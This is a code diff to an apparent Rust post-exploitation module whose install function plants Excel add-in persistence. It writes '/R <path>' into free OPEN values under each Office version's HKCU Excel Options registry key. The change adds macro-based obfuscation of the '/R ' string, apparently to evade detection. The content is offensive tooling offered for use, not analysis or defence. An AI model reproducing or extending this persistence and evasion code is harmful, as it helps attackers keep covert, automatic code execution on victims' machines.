@@ -42,6 +42,7 @@ fn main(args: *mut u8, len: usize) {
 #[cfg(target_os = "windows")]
 fn install(path: &str) {
     use rustbof::{println, eprintln};
+    use common::obf_cstr;
     let versions = office::enumerate_versions();
     if versions.is_empty() { eprintln!("[!] office not installed"); return; }
     for ver in &versions {
@@ -53,8 +54,10 @@ fn install(path: &str) {
             Some(i) => i,
             None    => { eprintln!("[!] OPEN slots full ({})", ver); office::close(h); continue; }
         };
-        let mut val = alloc::string::String::with_capacity(3 + path.len());
-        val.push_str("/R ");
+        obf_cstr! { let r_flag = c"/R "; }
+        let r_s = core::str::from_utf8(r_flag.to_bytes()).unwrap_or("");
+        let mut val = alloc::string::String::with_capacity(r_s.len() + path.len());
+        val.push_str(r_s);
         val.push_str(path);
         if reg_open::write(h, slot, &val).is_ok() {
             println!("[+] OPEN HKCU\\Software\\Microsoft\\Office\\{}\\Excel\\Options\\{}", ver, reg_open::slot_name(slot));
